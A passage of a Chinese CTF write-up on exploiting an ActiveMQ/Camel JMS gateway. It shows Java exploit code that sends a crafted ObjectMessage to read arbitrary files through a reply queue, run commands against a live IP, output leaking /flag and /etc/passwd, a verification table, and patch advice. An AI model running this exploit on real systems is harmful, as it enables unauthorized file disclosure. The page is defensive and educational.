+                <span class="n">cc</span> <span class="o">=</span> <span class="n">cc</span><span class="o">.</span><span class="na">getSuperclass</span><span class="o">();</span>
+            <span class="o">}</span>
+            <span class="n">f</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+            <span class="n">f</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">om</span><span class="o">,</span> <span class="k">new</span> <span class="nc">ByteSequence</span><span class="o">(</span><span class="n">payload</span><span class="o">));</span>
+            <span class="n">om</span><span class="o">.</span><span class="na">setJMSReplyTo</span><span class="o">(</span><span class="n">replyQ</span><span class="o">);</span>
+            <span class="nc">MessageProducer</span> <span class="n">p</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="na">createProducer</span><span class="o">(</span><span class="n">s</span><span class="o">.</span><span class="na">createQueue</span><span class="o">(</span><span class="s">"gateway.inbound"</span><span class="o">));</span>
+            <span class="n">p</span><span class="o">.</span><span class="na">send</span><span class="o">(</span><span class="n">om</span><span class="o">);</span>
+            <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"[*] ObjectMessage sent to gateway.inbound with JMSReplyTo"</span><span class="o">);</span>
+
+            <span class="c1">// 4. 消费回复（网关会把文件内容放在 MapMessage 的 key 里）</span>
+            <span class="nc">MessageConsumer</span> <span class="n">mc</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="na">createConsumer</span><span class="o">(</span><span class="n">replyQ</span><span class="o">);</span>
+            <span class="nc">Message</span> <span class="n">m</span> <span class="o">=</span> <span class="n">mc</span><span class="o">.</span><span class="na">receive</span><span class="o">(</span><span class="mi">20000</span><span class="o">);</span>
+            <span class="k">if</span> <span class="o">(</span><span class="n">m</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+                <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"[-] no reply in 20s (file not found or unreachable)"</span><span class="o">);</span>
+                <span class="k">return</span><span class="o">;</span>
+            <span class="o">}</span>
+            <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"[+] REPLY: "</span> <span class="o">+</span> <span class="n">m</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getSimpleName</span><span class="o">());</span>
+            <span class="k">if</span> <span class="o">(</span><span class="n">m</span> <span class="k">instanceof</span> <span class="nc">MapMessage</span><span class="o">)</span> <span class="o">{</span>
+                <span class="nc">MapMessage</span> <span class="n">mm</span> <span class="o">=</span> <span class="o">(</span><span class="nc">MapMessage</span><span class="o">)</span> <span class="n">m</span><span class="o">;</span>
+                <span class="nc">Enumeration</span><span class="o">&lt;?&gt;</span> <span class="n">en</span> <span class="o">=</span> <span class="n">mm</span><span class="o">.</span><span class="na">getMapNames</span><span class="o">();</span>
+                <span class="k">while</span> <span class="o">(</span><span class="n">en</span><span class="o">.</span><span class="na">hasMoreElements</span><span class="o">())</span> <span class="o">{</span>
+                    <span class="nc">String</span> <span class="n">k</span> <span class="o">=</span> <span class="o">(</span><span class="nc">String</span><span class="o">)</span> <span class="n">en</span><span class="o">.</span><span class="na">nextElement</span><span class="o">();</span>
+                    <span class="nc">String</span> <span class="n">v</span> <span class="o">=</span> <span class="nc">String</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="n">mm</span><span class="o">.</span><span class="na">getObject</span><span class="o">(</span><span class="n">k</span><span class="o">));</span>
+                    <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"[+] map key = "</span> <span class="o">+</span> <span class="n">k</span><span class="o">);</span>
+                    <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"[+] map value = "</span> <span class="o">+</span> <span class="n">v</span><span class="o">);</span>
+                <span class="o">}</span>
+            <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">m</span> <span class="k">instanceof</span> <span class="nc">TextMessage</span><span class="o">)</span> <span class="o">{</span>
+                <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"[+] text = "</span> <span class="o">+</span> <span class="o">((</span><span class="nc">TextMessage</span><span class="o">)</span> <span class="n">m</span><span class="o">).</span><span class="na">getText</span><span class="o">());</span>
+            <span class="o">}</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>编译运行（依赖：网关附件 <code class="language-plaintext highlighter-rouge">de5er1um.jar</code> 解包出的 <code class="language-plaintext highlighter-rouge">BOOT-INF/lib/*</code>，或等价 maven 依赖）：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">CP</span><span class="o">=</span><span class="s2">"lib/*:activemq-http-6.1.8.jar:xstream-1.4.20.jar:xpp3-1.1.4c.jar:xmlpull-1.1.3.1.jar:httpclient-4.5.14.jar:httpcore-4.4.16.jar:commons-codec-1.16.1.jar:commons-logging-1.2.jar"</span>
+javac <span class="nt">-cp</span> <span class="s2">"</span><span class="nv">$CP</span><span class="s2">"</span> ExploitDe5er1um.java
+java <span class="nt">-cp</span> <span class="s2">"</span><span class="nv">$CP</span><span class="s2">:."</span> ExploitDe5er1um http://47.116.47.26:28364 /flag
+</code></pre></div></div>
+
+<h2 id="4-poc-执行验证结果">4. PoC 执行验证结果</h2>
+
+<h3 id="41-读取-flag直接命中">4.1 读取 /flag（直接命中）</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># @hl 5</span>
+<span class="nv">$ </span>java <span class="nt">-cp</span> <span class="s2">"</span><span class="nv">$CP</span><span class="s2">:."</span> ExploitDe5er1um http://47.116.47.26:28364 /flag
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> reply queue: queue://flag.exfil.32370
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> ObjectMessage sent to gateway.inbound with JMSReplyTo
+<span class="o">[</span>+] REPLY: ActiveMQMapMessage
+<span class="o">[</span>+] map key <span class="o">=</span> flag<span class="o">{</span>FtkGd6CuYmD5nH7MUcswPeAf2NEz1qjO<span class="o">}</span>
+
+<span class="o">[</span>+] map value <span class="o">=</span> x
+</code></pre></div></div>
+
+<h3 id="42-读取-etcpasswd验证任意文件读取非预期路径">4.2 读取 /etc/passwd（验证任意文件读取，非预期路径）</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># @hl 5-9</span>
+<span class="nv">$ </span>java <span class="nt">-cp</span> <span class="s2">"</span><span class="nv">$CP</span><span class="s2">:."</span> ExploitDe5er1um http://47.116.47.26:28364 /etc/passwd
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> reply queue: queue://flag.exfil.&lt;n&gt;
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> ObjectMessage sent to gateway.inbound with JMSReplyTo
+<span class="o">[</span>+] REPLY: ActiveMQMapMessage
+<span class="o">[</span>+] map key <span class="o">=</span> root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+...
+ctf:x:1001:1001::/home/ctf:/usr/sbin/nologin
+
+<span class="o">[</span>+] map value <span class="o">=</span> x
+</code></pre></div></div>
+
+<h3 id="43-不存在路径无回复">4.3 不存在路径（无回复）</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ java -cp "$CP:." ExploitDe5er1um http://47.116.47.26:28364 /no-such-file
+[-] no reply in 20s (file not found or unreachable)
+</code></pre></div></div>
+
+<p>（TypeConverter 转换失败导致回复异常/无回复，可作为存在性判断）</p>
+
+<h2 id="5-关键验证记录黑盒确认链">5. 关键验证记录（黑盒确认链）</h2>
+
+<table>
+  <thead>
+    <tr>
+      <th>验证项</th>
+      <th>结果</th>
+      <th>意义</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>URLDNS</td>
+      <td>靶机出口（8.132.x/47.116.x/47.101.x）DNS 查询</td>
+      <td>反序列化通道可用，<code class="language-plaintext highlighter-rouge">java.net.URL</code> 在白名单</td>
+    </tr>
+    <tr>
+      <td>org.apache.camel.support</td>
+      <td>靶机 DNS 查询</td>
+      <td><code class="language-plaintext highlighter-rouge">org.apache.camel</code> 在白名单（CVE-2026-43866 也成立，但本解法不需要）</td>
+    </tr>
+    <tr>
+      <td>POJONode/HotSwappableTargetSource…</td>
+      <td>无任何交互</td>
+      <td>白名单外类被 <code class="language-plaintext highlighter-rouge">ObjectInputFilter</code> 拦截，标准 gadget 链不可用</td>
+    </tr>
+    <tr>
+      <td>file:///etc/passwd + JMSReplyTo</td>
+      <td>回复 MapMessage key = passwd 全文</td>
+      <td><strong>TypeConverter 读取 URL 内容 → 任意文件读取</strong></td>
+    </tr>
+    <tr>
+      <td>file:///flag + JMSReplyTo</td>
+      <td>key = flag{…}</td>
+      <td><strong>拿到 flag</strong></td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="6-修复建议">6. 修复建议</h2>
+
+<ol>
+  <li>升级 Camel 至 <strong>4.18.3 / 4.14.8 / 4.21.0</strong>（修复 CVE-2026-40860 不完整问题、CVE-2026-42527、CVE-2026-43866；4.18.3 起 <code class="language-plaintext highlighter-rouge">objectMessageEnabled</code> 默认关闭，不再无条件反序列化 ObjectMessage）</li>
+  <li>broker 侧启用授权，限制对 Camel 消费队列的发布者</li>
+  <li>覆盖默认过滤器：<code class="language-plaintext highlighter-rouge">-Djdk.serialFilter='!java.net.**;java.**;javax.**;org.apache.camel.**;!*'</code>（显式 deny java.net 阻断 URL DNS 侧信道）</li>
+</ol>
+
+        </article>
+
+        <!-- TOC (desktop right sidebar) -->
+        <aside class="doc-toc" id="doc-toc">
+          <div class="doc-toc-title">目录</div>
+          <ul class="doc-toc-list" id="doc-toc-list"></ul>
+        </aside>
+
+      </div>
+
+      <!-- Prev / Next Pager -->
+      
+      
+
+      
+      
+      
+
+      
+      
+      
+      
+
+      
+      <nav class="doc-pager">
+        
+        <a class="doc-pager-item" href="/document/00_ctf/00_overview/">
+          <div class="doc-pager-label"><i class="fas fa-arrow-left"></i> 上一篇</div>
+          <div class="doc-pager-title">数据安全与AI安全理论赛知识点汇编</div>
+        </a>
+        
+        
+        <a class="doc-pager-item doc-pager-item--next" href="/document/00_ctf/02_de5er1um_jar_analysis/">
+          <div class="doc-pager-label">下一篇 <i class="fas fa-arrow-right"></i></div>
+          <div class="doc-pager-title">de5er1um.jar 逆向分析报告</div>
+        </a>
+        
+      </nav>
+      
+      
+
+
+<div class="doc-suggestion">
+    <!-- 1. 申明模块 -->
+    <section class="doc-suggestion-section">
+      <div class="doc-suggestion-heading">申明</div>
+      <div class="doc-suggestion-links">
+        <a class="doc-suggestion-link" href="https://bin4xin.github.io/document/00_ctf/01_de5er1um_wp/" target="_blank">
+          <i class="fas fa-fingerprint"></i>
+          转载请申明本文档链接
+        </a>
+        <a class="doc-suggestion-link" href="https://github.com/sentryCyberSec" target="_blank">
+          <i class="fas fa-hat-wizard"></i>
+          
+          
+            Post by sentinel, Lab.
+          
+        </a>
+      </div>
+    </section>
+  
+    <!-- 2. 贡献开源文档 -->
+    <section class="doc-suggestion-section">
+      <div class="doc-suggestion-heading">贡献开源文档</div>
+      <div class="doc-suggestion-links">
+        <a class="doc-suggestion-link" href="https://github.com/Bin4xin/bin4xin.github.io/tree/main/_document/00_ctf/01_de5er1um_wp.md" target="_blank">
+          <i class="fas fa-code-branch"></i>
+          贡献当前文档
+        </a>
+        <a class="doc-suggestion-link" href="https://github.com/Bin4xin/bin4xin.github.io/wiki/Git操作-Git如何贡献仓库代码" target="_blank">
+          <i class="fas fa-seedling"></i>
+          学习开源贡献
+        </a>
+        <a class="doc-suggestion-link" href="https://github.com/github/docs" target="_blank">
+          <i class="fas fa-globe"></i>
+          Learning about open source contributions
+        </a>
+      </div>
+    </section>
+  
+    <!-- 3. 此文档对您有帮助吗 -->
+    <section class="doc-suggestion-section">
+      <div class="doc-suggestion-heading">此文档对您有帮助吗</div>
+      <div class="doc-suggestion-feedback">
+        <a class="doc-suggestion-feedback-btn"
+           href="https://github.com/Bin4xin/bin4xin.github.io/"
+           target="_blank"
+           title="给文档仓库点个赞!">
+          <i class="fas fa-heart"></i>
+        </a>
+        <a class="doc-suggestion-feedback-btn"
+           href="https://github.com/Bin4xin/bin4xin.github.io/issues/new?labels=Service+Issue,research&template=2-bug_report.yaml&title=_document/00_ctf/01_de5er1um_wp.md&nbsp;de5er1umWriteUp — ActiveMQ/Camel JMS | © 哨兵 | SENTINEL SECURITY, LAB"
+           target="_blank"
+           title="本文档有问题?">
+          <i class="fas fa-bug"></i>
+        </a>
+        <p class="doc-suggestion-feedback-label">感谢您的反馈</p>
+      </div>
+    </section>
+</div>
+    </main>
+  </div>
+
+  
+<!-- Lightbox DOM -->
+<div class="lb-overlay" id="lb-overlay">
+<button class="lb-close" id="lb-close"><i class="fas fa-times"></i></button>
+<button class="lb-arrow lb-prev" id="lb-prev"><i class="fas fa-chevron-left"></i></button>
+<button class="lb-arrow lb-next" id="lb-next"><i class="fas fa-chevron-right"></i></button>
+<img class="lb-img" id="lb-img" src="" alt="" draggable="false">
+<span class="lb-counter" id="lb-counter"></span>
+<div class="lb-zoom">
+    <button class="lb-zoom-btn" id="lb-zoom-out"><i class="fas fa-minus"></i></button>
+    <span class="lb-zoom-level" id="lb-zoom-level">100%</span>
+    <button class="lb-zoom-btn" id="lb-zoom-in"><i class="fas fa-plus"></i></button>
+    <button class="lb-zoom-btn" id="lb-zoom-reset"><i class="fas fa-expand"></i></button>
+</div>
+</div>
+
+<script>
+(function(){
+var overlay   = document.getElementById('lb-overlay');
+var img       = document.getElementById('lb-img');
+var btnClose  = document.getElementById('lb-close');
+var btnPrev   = document.getElementById('lb-prev');
+var btnNext   = document.getElementById('lb-next');
+var counter   = document.getElementById('lb-counter');
+var zoomIn    = document.getElementById('lb-zoom-in');
+var zoomOut   = document.getElementById('lb-zoom-out');
+var zoomReset = document.getElementById('lb-zoom-reset');
+var zoomLevel = document.getElementById('lb-zoom-level');
+
+var images = [];
+var idx    = 0;
+var scale  = 1;
+var posX   = 0;
+var posY   = 0;
+
+// ── Collect all clickable images (with src dedup) ──
+  function collectImages(){
+    var containers = document.querySelectorAll('#help-content, .markdown-body-img, .post-content, .article-content, .ct-card__body, .lb-target');
+    images = [];
+    var seen = {};
+
+    containers.forEach(function(c){
+      c.querySelectorAll('img').forEach(function(im){
+        if(im.getAttribute('data-lb-ignore')) return;
+        if(im.getAttribute('width') && parseInt(im.getAttribute('width')) < 60) return;
+        if(im.getAttribute('height') && parseInt(im.getAttribute('height')) < 60) return;
+        if(images.indexOf(im) !== -1) return;
+
+        var key = im.getAttribute('data-src') || im.src;
+        if(seen[key]) return;
+        seen[key] = true;
+
+        images.push(im);
+        im.addEventListener('click', function(e){
+          e.preventDefault();
+          openAt(im);
+        });
+      });
+    });
+
+    // Also catch any img with class "lb-clickable"
+    document.querySelectorAll('img.lb-clickable').forEach(function(im){
+      if(images.indexOf(im) === -1){
+        images.push(im);
+        im.addEventListener('click', function(e){
+          e.preventDefault();
+          openAt(im);
+        });
+      }
+    });
+  }
+
+// ── Open at specific image ──
+function openAt(targetImg){
+    idx = images.indexOf(targetImg);
+    if(idx === -1) idx = 0;
+    showImage();
+    overlay.classList.add('is-active');
+    document.body.style.overflow = 'hidden';
+}
+
+// ── Show image at current index ──
+function showImage(){
+    if(!images[idx]) return;
+    var src = images[idx].getAttribute('data-src') || images[idx].src;
+    img.src = src;
+    img.alt = images[idx].alt || '';
+    counter.textContent = (idx + 1) + ' / ' + images.length;
+    btnPrev.style.display = images.length > 1 ? '' : 'none';
+    btnNext.style.display = images.length > 1 ? '' : 'none';
+    resetZoom();
+}
+
+// ── Close ──
+function close(){
+    overlay.classList.remove('is-active');
+    document.body.style.overflow = '';
+    resetZoom();
+}
+
+// ── Navigate ──
+function goPrev(){
+    if(images.length <= 1) return;
+    idx = (idx - 1 + images.length) % images.length;
+    showImage();
+}
+function goNext(){
+    if(images.length <= 1) return;
+    idx = (idx + 1) % images.length;
+    showImage();
+}
+
+// ── Zoom ──
+function applyZoom(){
+    img.style.transform = 'scale(' + scale + ') translate(' + posX + 'px, ' + posY + 'px)';
+    zoomLevel.textContent = Math.round(scale * 100) + '%';
+}
+function zoomTo(s){
+    scale = Math.max(0.5, Math.min(5, s));
+    if(scale === 1){ posX = 0; posY = 0; }
+    applyZoom();
+}
+function resetZoom(){
+    scale = 1; posX = 0; posY = 0;
+    applyZoom();
+}
+
+// ── Drag when zoomed ──
+var dragging = false, dragStartX, dragStartY, startPosX, startPosY;
+
+img.addEventListener('mousedown', function(e){
+    if(scale <= 1) return;
+    e.preventDefault();
+    dragging = true;
+    img.classList.add('is-dragging');
+    dragStartX = e.clientX;
+    dragStartY = e.clientY;
+    startPosX  = posX;
+    startPosY  = posY;
+});
+document.addEventListener('mousemove', function(e){
+    if(!dragging) return;
+    posX = startPosX + (e.clientX - dragStartX) / scale;
+    posY = startPosY + (e.clientY - dragStartY) / scale;
+    applyZoom();
+});
+document.addEventListener('mouseup', function(){
+    dragging = false;
+    img.classList.remove('is-dragging');
+});
+
+// Mouse wheel zoom
+overlay.addEventListener('wheel', function(e){
+    if(!overlay.classList.contains('is-active')) return;
+    e.preventDefault();
+    var delta = e.deltaY > 0 ? -0.15 : 0.15;
+    zoomTo(scale + delta);
+}, { passive: false });
+
+// Pinch zoom (touch)
+var lastTouchDist = 0;
+overlay.addEventListener('touchstart', function(e){
+    if(e.touches.length === 2){
+    var dx = e.touches[0].clientX - e.touches[1].clientX;
+    var dy = e.touches[0].clientY - e.touches[1].clientY;
+    lastTouchDist = Math.sqrt(dx * dx + dy * dy);
+    }
+}, { passive: true });
+overlay.addEventListener('touchmove', function(e){
+    if(e.touches.length === 2){
+    e.preventDefault();
+    var dx = e.touches[0].clientX - e.touches[1].clientX;
+    var dy = e.touches[0].clientY - e.touches[1].clientY;
+    var dist = Math.sqrt(dx * dx + dy * dy);
+    var delta = (dist - lastTouchDist) * 0.008;
+    lastTouchDist = dist;
+    zoomTo(scale + delta);
+    }
+}, { passive: false });
+
+// Double-click to toggle zoom
+img.addEventListener('dblclick', function(e){
+    e.preventDefault();
+    if(scale > 1){
+    resetZoom();
+    } else {
+    zoomTo(2.5);
+    }
+});
+
+// ── Swipe navigation (touch) ──
+var touchStartX = 0, touchStartY = 0, swiping = false;
+img.addEventListener('touchstart', function(e){
+    if(e.touches.length !== 1 || scale > 1) return;
+    swiping = true;
+    touchStartX = e.touches[0].clientX;
+    touchStartY = e.touches[0].clientY;
+}, { passive: true });
+img.addEventListener('touchend', function(e){
+    if(!swiping) return;
+    swiping = false;
+    var dx = e.changedTouches[0].clientX - touchStartX;
+    if(Math.abs(dx) > 60){
+    dx > 0 ? goPrev() : goNext();
+    }
+}, { passive: true });
+
+// ── Keyboard ──
+document.addEventListener('keydown', function(e){
+    if(!overlay.classList.contains('is-active')) return;
+    switch(e.key){
+    case 'Escape':  close(); break;
+    case 'ArrowLeft':  goPrev(); break;
+    case 'ArrowRight': goNext(); break;
+    case '+': case '=': zoomTo(scale + 0.2); break;
+    case '-': zoomTo(scale - 0.2); break;
+    case '0': resetZoom(); break;
+    }
+});
+
+// ── Click events ──
+overlay.addEventListener('click', function(e){
+    if(e.target === overlay) close();
+});
+btnClose.addEventListener('click', close);
+btnPrev.addEventListener('click', function(e){ e.stopPropagation(); goPrev(); });
+btnNext.addEventListener('click', function(e){ e.stopPropagation(); goNext(); });
+zoomIn.addEventListener('click', function(e){ e.stopPropagation(); zoomTo(scale + 0.25); });
+zoomOut.addEventListener('click', function(e){ e.stopPropagation(); zoomTo(scale - 0.25); });
+zoomReset.addEventListener('click', function(e){ e.stopPropagation(); resetZoom(); });
+
+// ── Init ──
+if(document.readyState === 'loading'){
+    document.addEventListener('DOMContentLoaded', collectImages);
+} else {
+    collectImages();
+}
+})();
+</script>
+  
+<link rel="stylesheet" href="/assets/css/components/code-line-highlight.css">
+<script>
+(function(){
+  'use strict';
+  function parseRange(str){
+    var lines = new Set();
+    if(!str) return lines;
+    str.split(',').forEach(function(part){
+      part = part.trim();
+      if(part.indexOf('-') !== -1){
+        var r = part.split('-');
+        var s = parseInt(r[0], 10);
+        var e = parseInt(r[1], 10);
+        if(!isNaN(s) && !isNaN(e)){
+          for(var i = s; i <= e; i++) lines.add(i);
+        }
+      } else {
+        var n = parseInt(part, 10);
+        if(!isNaN(n)) lines.add(n);
+      }
+    });
+    return lines;
+  }
+
+  function stripTags(html){
+    return html.replace(/<[^>]*>/g, '');
+  }
+
+  // Matches one or more directives:  @hl 2-4  @add 5  @del 6-8
+  //   # @hl 2-4,7 @add 9 @del 12-14
+  //   // @add 1,3
+  //   /* @del 2-5 */
+  //   <!-- @hl 1 @del 4 -->
+  var RE = /^\s*(?:#|\/\/|\/\*;?|<!--|--|;)\s*((?:@(?:hl|add|del)\s+[\d,\-]+\s*)+)(?:\*\/|-->)?\s*$/;
+  var DIR_RE = /@(hl|add|del)\s+([\d,\-]+)/g;
+
+  function init(){
+    document.querySelectorAll('pre').forEach(function(pre){
+      if(pre.dataset.hlDone) return;
+
+      var codeEl = pre.querySelector('code');
+      if(!codeEl) return;
+
+      var rawHTML = codeEl.innerHTML;
+      var htmlLines = rawHTML.split('\n');
+
+      // Remove trailing empty line
+      if(htmlLines.length > 1 && htmlLines[htmlLines.length - 1].trim() === ''){
+        htmlLines.pop();
+      }
+      if(htmlLines.length === 0) return;
+
+      // Check first line
+      var firstLineText = stripTags(htmlLines[0]).trim();
+      var match = firstLineText.match(RE);
+      if(!match) return;
+
+      // Parse all directives
+      var hlLines  = new Set();
+      var addLines = new Set();
+      var delLines = new Set();
+      var dirMatch;
+      while((dirMatch = DIR_RE.exec(match[1])) !== null){
+        var type  = dirMatch[1];
+        var range = parseRange(dirMatch[2]);
+        range.forEach(function(n){
+          if(type === 'hl')  hlLines.add(n);
+          if(type === 'add') addLines.add(n);
+          if(type === 'del') delLines.add(n);
+        });
+      }
+
+      if(hlLines.size === 0 && addLines.size === 0 && delLines.size === 0) return;
+
+      pre.dataset.hlDone = '1';
+
+      // Remove magic comment line
+      var codeHTMLLines = htmlLines.slice(1);
+
+      // Wrap lines
+      var result = codeHTMLLines.map(function(lineHTML, i){
+        var lineNum = i + 1;
+        if(delLines.has(lineNum)){
+          return '<span class="del-line">' + lineHTML + '</span>';
+        }
+        if(addLines.has(lineNum)){
+          return '<span class="add-line">' + lineHTML + '</span>';
+        }
+        if(hlLines.has(lineNum)){
+          return '<span class="hl-line">' + lineHTML + '</span>';
+        }
+        return lineHTML;
+      }).join('\n');
+
+      codeEl.innerHTML = result;
+      pre.classList.add('has-hl-lines');
+    });
+  }
+
+  if(document.readyState === 'loading'){
+    document.addEventListener('DOMContentLoaded', function(){ setTimeout(init, 50); });
+  } else {
+    setTimeout(init, 50);
+  }
+
+  if(typeof MutationObserver !== 'undefined'){
+    var observer = new MutationObserver(function(){ init(); });
+    var target = document.querySelector('.doc-article-body, .post-content, article');
+    if(target) observer.observe(target, { childList: true, subtree: true });
+  }
+})();
+</script>
+
+
+  <script src="/assets/js/cate-document.js"></script>
+
+</body>
+</html>
